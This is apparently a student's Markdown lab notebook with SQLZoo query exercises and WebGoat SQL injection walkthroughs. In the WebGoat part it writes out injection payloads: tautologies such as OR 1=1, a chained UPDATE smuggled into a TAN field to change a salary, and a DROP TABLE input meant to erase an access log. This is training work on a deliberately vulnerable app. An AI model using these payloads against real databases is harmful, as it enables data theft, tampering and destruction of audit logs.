# Table of Contents
1. [Read and summarize](#read-and-summarize)
2. [SQLZoo](#sqlzoo)
3. [WebGoat](#webgoat)

# Read and summarize

## OWASP Top 10 2021

### A05:2021-Security Misconfiguration

### A06:2021-Vulnerable and Outdated Components

### A03:2021-Injection

## Darknet Diaries

## CVE

# SQLZoo

## 0 SELECT basics
In my previous two years, we had a lot of SQL classes, so I didn't have any problems solving these different points.

1. Introducing the world table of countries
```sql
SELECT population FROM world
  WHERE name = 'Germany'
```
I just had to change what was in the WHERE clause to get the answer.

2. Scandinavia
```sql
SELECT name, population FROM world
  WHERE name IN ('Sweden', 'Norway', 'Denmark');
```
I just had to change the three countries in the WHERE clause to get the answer.

3. Just the right size
```sql
SELECT name, area FROM world
  WHERE area BETWEEN 200000 AND 250000;
```
I just had to change the area in the WHERE clause to get the answer.

## 2 SELECT from World

1. Introduction
```sql
SELECT name, continent, population FROM world;
```
This SQL query returns only the name, continent and population columns.

2. Large Countries
```sql
SELECT name FROM world
WHERE population >= 200000000
```
This SQL query returns only the name of countries with a population of at least 200 million.

3. Per capita GDP
```sql
SELECT name, (gdp/population) as PerCapitaGDP FROM world
WHERE population >= 200000000;
```
In this query, I had to divide the GDP by the population to get the PerCapitaGDP.
The as keyword is used to rename the column.

4. South America In millions
```sql
SELECT name, (population/1000000) FROM world
WHERE continent = 'South America'
```
In this query, I had to divide the population by 1 million to get the population in millions.

5. France, Germany, Italy
```sql
SELECT name, population FROM world
WHERE name IN ('France', 'Germany', 'Italy')
```
In this query, I had to use the IN keyword to get the name of the countries.

# WebGoat

## A1 Injection (intro)

### What is SQL?
Try to retrieve the department of the employee Bob Franco.
```sql
SELECT department FROM employees WHERE first_name = 'Bob' AND last_name = 'Franco';
```

### Data Manipulation Language (DML)
Try to change the department of Tobi Barnett to 'Sales'.
```sql
UPDATE employees SET department = 'Sales' WHERE first_name = 'Tobi' AND last_name = 'Barnett';
```

### Data Definition Language (DDL)
Now try to modify the scheme by adding the column "phone" (varchar(20)) to the table "employees".
```sql
ALTER TABLE employees ADD phone Varchar(20);
```

### Data Control Language (DCL)
Try to grant the usergroup "UnauthorizedUser" the right to alter tables.
```sql
GRANT ALTER TABLE TO UnauthorizedUser;
```

### String SQL injection
Try to retrieve all the users from the users table.
```sql
SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1';
```

<img src="String_SQL_Injection.png" alt="String SQL Injection" width="700">

Explanation: This injection works, because or '1' = '1' always evaluates to true (The string ending literal for '1 is closed by the query itself, so you should not inject it). So the injected query basically looks like this: SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE, which will always evaluate to true, no matter what came before it.

### Numeric SQL injection
Try to retrieve all the users from the users table.
```sql
SELECT * From user_data WHERE Login_Count = 1 and userid= 1 OR 1=1;
```
For this query, the numerical value of Login_Count does not matter.
Just give any numeric value to userid and add "OR 1=1" which is always TRUE.

### Compromising confidentiality with String SQL injection

<img src="String_SQL_Injection(2).png" alt="String SQL Injection (2)" width="300">

For this query, the string value in the last_name field does not matter.
Just give any string value to auth_tan and add "OR 1=1" which is always TRUE.
You don't need to add the single quotes at the end, because the query itself will close the string.

### Compromising Integrity with Query chaining

Employee Name: Smith

Authentication TAN: 3SL99A'; UPDATE employees SET salary = 666666666 WHERE first_name = 'John' AND last_name = 'Smith

<img src="Query_Chaining.png" alt="Query Chaining" width="700">

For this query, give the employee name and the authentication TAN.
Then add the query you want to execute after the authentication TAN.
We must not add the single quotes at the end, because the query itself will close the string.

### Compromising Availability
Try to delete access_log completely before anyone notices.
```sql
Brenda'; DROP TABLE access_log;--
```
For this query, you just have to give any string value, close the string and add the query you want to execute.